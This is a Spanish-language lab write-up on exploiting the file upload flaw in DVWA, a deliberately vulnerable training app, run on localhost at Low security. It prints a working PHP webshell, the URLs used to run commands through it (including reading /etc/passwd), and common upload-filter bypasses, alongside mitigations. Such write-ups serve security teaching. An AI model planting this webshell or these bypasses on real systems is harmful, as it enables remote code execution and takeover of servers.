# 📂 File Upload Exploitation – DVWA

## 📌 Introducción

La vulnerabilidad de **File Upload** ocurre cuando una aplicación web permite que un usuario suba ficheros sin validaciones correctas sobre su contenido o extensión.  
Un atacante puede aprovechar esto para subir archivos maliciosos (por ejemplo, una **webshell en PHP**) y obtener ejecución remota de comandos en el servidor.  

En entornos reales, esta vulnerabilidad puede llevar a **RCE (Remote Code Execution)** si no existen medidas de seguridad adecuadas.  

---

## 🧪 Entorno de práctica

- **Plataforma:** Damn Vulnerable Web Application (DVWA)  
- **Nivel de seguridad:** `Low`  
- **URL vulnerable:** http://127.0.0.1:8080/vulnerabilities/upload/

---

## 🔎 Paso 1 – Acceso a la funcionalidad

1. Accedemos a la sección `File Upload` desde el menú de DVWA.  
2. En nivel **Low**, la aplicación debería permitir subir cualquier tipo de archivo sin filtrar.  

<img width="534" height="380" alt="imagen" src="https://github.com/user-attachments/assets/4395cb18-0bd0-420f-a48b-41e194dd53ab" />


---

## 🛠 Paso 2 – Preparar un archivo malicioso

Creamos un archivo en Kali con una **webshell simple en PHP**:

```php
<?php
if(isset($_GET['cmd'])) {
  system($_GET['cmd']);
}
?>
```

Lo guardamos como: shell.php

## 📤 Paso 3 – Subir el archivo

1. Seleccionamos shell.php en el formulario de subida.
2. DVWA lo moverá a la carpeta de cargas:

Vemos que la shell.php fue subida correctamente:

<img width="503" height="239" alt="imagen" src="https://github.com/user-attachments/assets/6ac55bf0-f8c0-4186-a4ad-3bc10d98bf73" />

```swift
/dvwa/hackable/uploads/
```

Si la subida es exitosa, deberíamos ver un mensaje indicando el archivo disponible.

## 🔗 Paso 4 – Acceder a la webshell

Navegamos a la URL del archivo subido:

```ruby
http://127.0.0.1:8080/hackable/uploads/shell.php
```

Y probamos a ejecutar un comando:

```bash
http://127.0.0.1:8080/hackable/uploads/shell.php?cmd=whoami
```

Y vemos como nos devuelve la información de usuario:

<img width="739" height="167" alt="imagen" src="https://github.com/user-attachments/assets/74dfbaf4-a068-43a4-8340-e720e625cfd5" />


## ⚙️ Paso 5 – Probar más comandos

Ejemplos de comandos útiles:

```bash
?cmd=id
?cmd=uname -a
?cmd=ls -la
?cmd=cat /etc/passwd
```

Con esto podemos verificar la extensión del acceso obtenido.

## 📚 Notas adicionales

- En Medium y High, DVWA introduce validaciones como comprobar la extensión o MIME type.
- Bypass comunes:
  - Extensiones dobles (shell.php.jpg).
  - Mayúsculas/minúsculas (shell.PhP).
  - Subida de archivos .htaccess para interpretar .jpg como PHP.
- En entornos reales, hay protecciones adicionales como:
  - Filtrado de contenido.
  - Reescritura de nombres de archivos.
  - Almacenamiento en directorios no ejecutables.
 
## ✅ Conclusiones

- En nivel Low DVWA, la subida de ficheros es directa y nos permite ejecutar código PHP en el servidor.
- Hemos comprobado la vulnerabilidad con una webshell básica.
- En escenarios reales, esta vulnerabilidad puede otorgar control total del servidor si no está mitigada correctamente.
